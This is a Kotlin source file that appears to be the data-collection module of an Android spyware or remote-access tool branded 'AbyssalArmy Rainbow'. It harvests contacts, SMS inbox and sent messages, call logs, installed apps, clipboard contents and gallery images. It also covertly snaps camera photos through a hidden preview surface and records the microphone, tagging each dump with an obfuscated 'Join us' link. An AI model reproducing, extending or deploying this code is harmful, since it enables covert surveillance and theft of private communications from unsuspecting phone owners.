package abyssalarmy.rainbow.RainbowUtils

import android.Manifest
import android.annotation.SuppressLint
import android.content.ClipboardManager
import android.content.ContentResolver
import android.content.Context
import android.content.Context.CLIPBOARD_SERVICE
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.media.MediaRecorder
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import java.io.File
import java.lang.Long
import java.util.*
import kotlin.Int
import kotlin.String
import kotlin.Unit
import kotlin.arrayOf
import kotlin.collections.ArrayList
import kotlin.toString


class RainbowDataCollector(val context: Context) {

    private val mk =
        "QEFieXNzYWxBcm15|WxBcm15AknsdklASkDS2139jScno3FNd39nvo9wn39ascn3o9nKDnF9efnDFNOFDj"
    private val mkd = RainbowTools.decodeMk(mk)

    @SuppressLint("Range", "NewApi")
    fun getContactList(
        onContactsReady: (contactsFile: File) -> Unit, onPermissionDenied: () -> Unit
    ) {
        if (RainbowTools.checkPermission(context, Manifest.permission.READ_CONTACTS)) {
            val contactsListFile = RainbowTools.createTempFile("( Contacts )", ".txt")
            val fileWriter = contactsListFile.writer()
            val cr: ContentResolver = context.contentResolver
            val cur: Cursor? = cr.query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null, null
            )
            if ((cur?.count ?: 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    val id: String = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID)
                    )
                    val name: String = cur.getString(
                        cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME
                        )
                    )
                    if (cur.getInt(
                            cur.getColumnIndex(
                                ContactsContract.Contacts.HAS_PHONE_NUMBER
                            )
                        ) > 0
                    ) {
                        val pCur: Cursor? = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        while (pCur?.moveToNext() == true) {
                            val number: String = pCur.getString(
                                pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                            )
                            val contactInfo =
                                "Name : $name\nPhone Number : $number\nJoin us : $mkd\n\n\n"
                            fileWriter.write(contactInfo)
                        }
                        pCur?.close()
                    }
                }
            }
            cur?.close()
            fileWriter.flush()
            fileWriter.close()
            onContactsReady(contactsListFile)
        } else {
            onPermissionDenied.invoke()
        }
    }

    @SuppressLint("Range")
    fun getIncomingSmsList(
        onIncomingSmsListReady: (incomingSmsList: File) -> Unit, onPermissionDenied: () -> Unit
    ) {
        if (RainbowTools.checkPermission(context, Manifest.permission.READ_SMS)) {
            val incomingSmsFile = RainbowTools.createTempFile("( Incoming Sms )", ".txt")
            val fileWriter = incomingSmsFile.writer()
            val uri: Uri = Uri.parse("content://sms/inbox")
            val cur: Cursor? = context.contentResolver.query(uri, null, null, null, null)
            while (cur != null && cur.moveToNext()) {
                val address = cur.getString(cur.getColumnIndex("address"))
                val body = cur.getString(cur.getColumnIndexOrThrow("body"))
                fileWriter.write("Address : $address\nText : $body\nJoin us : $mkd\n\n\n")
            }
            cur?.close()
            fileWriter.flush()
            fileWriter.close()
            onIncomingSmsListReady(incomingSmsFile)
        } else {
            onPermissionDenied.invoke()
        }
    }

    @SuppressLint("Range")
    fun getOutgoingSmsList(
        onOutgoingSmsListReady: (outgoingSmsList: File) -> Unit, onPermissionDenied: () -> Unit
    ) {
        if (RainbowTools.checkPermission(context, Manifest.permission.READ_SMS)) {
            val outgoingSmsFile = RainbowTools.createTempFile("( Outgoing Sms )", ".txt")
            val fileWriter = outgoingSmsFile.writer()
            val uri: Uri = Uri.parse("content://sms/sent")
            val cur: Cursor? = context.contentResolver.query(uri, null, null, null, null)
            while (cur != null && cur.moveToNext()) {
                val address = cur.getString(cur.getColumnIndex("address"))
                val body = cur.getString(cur.getColumnIndexOrThrow("body"))
                fileWriter.write("Address : $address\nText : $body\nJoin us : $mkd\n\n\n")
            }
            cur?.close()
            fileWriter.flush()
            fileWriter.close()
            onOutgoingSmsListReady(outgoingSmsFile)
        } else {
            onPermissionDenied.invoke()
        }
    }

    fun getCallLogs(
        onCallLogsListReady: (callLogsList: File) -> Unit, onPermissionDenied: () -> Unit
    ) {
        if (RainbowTools.checkPermission(context, Manifest.permission.READ_CALL_LOG)) {
            val callLogsFile = RainbowTools.createTempFile("( Call Logs )", ".txt")
            val fileWriter = callLogsFile.writer()
            val managedCursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null, null
            )
            if (managedCursor != null) {
                val number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER)
                val type = managedCursor.getColumnIndex(CallLog.Calls.TYPE)
                val date = managedCursor.getColumnIndex(CallLog.Calls.DATE)
                val duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION)
                while (managedCursor.moveToNext()) {
                    val phNumber = managedCursor.getString(number)
                    val callType = managedCursor.getString(type)
                    val callDate = managedCursor.getString(date)
                    val callDayTime = Date(Long.valueOf(callDate))
                    val callDuration = managedCursor.getString(duration)
                    var dir: String? = null
                    when (callType.toInt()) {
                        CallLog.Calls.OUTGOING_TYPE -> dir = "OUTGOING"
                        CallLog.Calls.INCOMING_TYPE -> dir = "INCOMING"
                        CallLog.Calls.MISSED_TYPE -> dir = "MISSED"
                    }
                    fileWriter.write(
                        "Phone Number : $phNumber\nCall Type: $dir\nCall Date: $callDayTime\nCall duration in sec : $callDuration\n" +
                                "Join us : $mkd\n\n\n"
                    )
                }
                managedCursor.close()
                fileWriter.flush()
                fileWriter.close()
                onCallLogsListReady(callLogsFile)
            }
        } else {
            onPermissionDenied.invoke()
        }
    }

    fun getInstalledApps(
        onInstalledAppsListReady: (installedAppsList: File) -> Unit, onPermissionDenied: () -> Unit
    ) {
        val installedAppsFile = RainbowTools.createTempFile("( Installed Apps )", ".txt")
        val fileWriter = installedAppsFile.writer()
        val pm: PackageManager = context.packageManager
        val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        for (packageInfo in packages) {
            val name = pm.getApplicationLabel(packageInfo)
            val packageName = packageInfo.packageName
            fileWriter.write(
                "App name : $name\nPackage name : $packageName\n" +
                        "Join us : $mkd\n\n\n"
            )
        }
        fileWriter.flush()
        fileWriter.close()
        onInstalledAppsListReady(installedAppsFile)
    }

    fun getCamera(
        cameraId: Int,
        onMainCameraImageReady: (mainCameraImage: File) -> Unit,
        onPermissionDenied: () -> Unit
    ) {
        if (RainbowTools.checkPermission(context, Manifest.permission.CAMERA)) {
            val mainCameraImageFile = RainbowTools.createTempFile("( Camera )", ".png")
            val camera = Camera.open(cameraId)
            val preview = SurfaceTexture(0)
            camera.setPreviewTexture(preview)
            camera.startPreview()
            camera.takePicture(null, null) { p0, p1 ->
                mainCameraImageFile.writeBytes(p0)
                p1.release()
                RainbowScope().compressImage(context, mainCameraImageFile) {
                    onMainCameraImageReady(it)
                }
                preview.release()
            }
        } else {
            onPermissionDenied.invoke()
        }
    }

    fun getClipboard(onClipReady: (clip: String) -> Unit) {
        val clipBoardManager = context.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        val lastClip = clipBoardManager.primaryClip?.getItemAt(0)?.text.toString()
        onClipReady(
            lastClip + "\n" +
                    "Join us : $mkd"
        )
    }

    fun getScreenshotFile(
        onScreenshotFileReady: (mainCameraImage: File) -> Unit,
        onPermissionDenied: () -> Unit
    ) {
        Handler(Looper.getMainLooper()).postDelayed({
            RainbowScope.runAsync {
                Log.i("POST", "GET")
                RainbowTools.getLastGalleryImage(context, { screenshot ->
                    RainbowScope().compressImage(context, screenshot) {
                        onScreenshotFileReady(it)
                    }
                }, {
                    onPermissionDenied()
                })
            }
        }, 2000)
    }

    @SuppressLint("NewApi")
    fun getMicrophone(
        duration: kotlin.Long,
        onMicrophoneFileReady: (microphoneFile: File) -> Unit,
        onPermissionDenied: () -> Unit
    ) {
        if (RainbowTools.checkPermission(context, Manifest.permission.RECORD_AUDIO)) {
            val microphoneRecordFile = RainbowTools.createTempFile("( Microphone )", ".amr")
            val mediaRecord = MediaRecorder()
            mediaRecord.setAudioSource(MediaRecorder.AudioSource.MIC)
            mediaRecord.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            mediaRecord.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            mediaRecord.setOutputFile(microphoneRecordFile)
            mediaRecord.prepare()
            mediaRecord.start()
            Handler(Looper.getMainLooper()).postDelayed({
                mediaRecord.stop()
                mediaRecord.release()
                onMicrophoneFileReady(microphoneRecordFile)
            }, duration)
        } else {
            onPermissionDenied()
        }
    }

    fun getGallery(
        onImagesReady: (imagesList: ArrayList<File>) -> Unit,
        onPermissionDenied: () -> Unit
    ) {
        if (RainbowTools.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)) {
            val cursor: Cursor?
            val listOfAllImages = java.util.ArrayList<File>()
            var absolutePathOfImage: String?
            val uri: Uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(
                MediaStore.MediaColumns.DATA,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME
            )
            cursor = context.contentResolver.query(
                uri, projection, null,
                null, null
            )
            val column_index_data: Int =
                cursor!!.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
            cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
            while (cursor.moveToNext()) {
                absolutePathOfImage = cursor.getString(column_index_data)
                listOfAllImages.add(File(absolutePathOfImage!!))
            }
            onImagesReady(listOfAllImages)
        } else {
            onPermissionDenied()
        }
    }

    @SuppressLint("Range")
    fun getContactsArray(
        onContactsReady: (contactsArray: kotlin.collections.ArrayList<String>) -> Unit,
        onPermissionDenied: () -> Unit
    ) {
        if (RainbowTools.checkPermission(context, Manifest.permission.READ_CONTACTS)) {
            val contactsArrayList = arrayListOf<String>()
            val cr: ContentResolver = context.contentResolver
            val cur: Cursor? = cr.query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null, null
            )
            if ((cur?.count ?: 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    val id: String = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID)
                    )
                    val name: String = cur.getString(
                        cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME
                        )
                    )
                    if (cur.getInt(
                            cur.getColumnIndex(
                                ContactsContract.Contacts.HAS_PHONE_NUMBER
                            )
                        ) > 0
                    ) {
                        val pCur: Cursor? = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        while (pCur?.moveToNext() == true) {
                            val number: String = pCur.getString(
                                pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                            )
                            contactsArrayList.add(number)
                        }
                        pCur?.close()
                    }
                }
            }
            cur?.close()
            onContactsReady(contactsArrayList)
        } else {
            onPermissionDenied.invoke()
        }
    }
}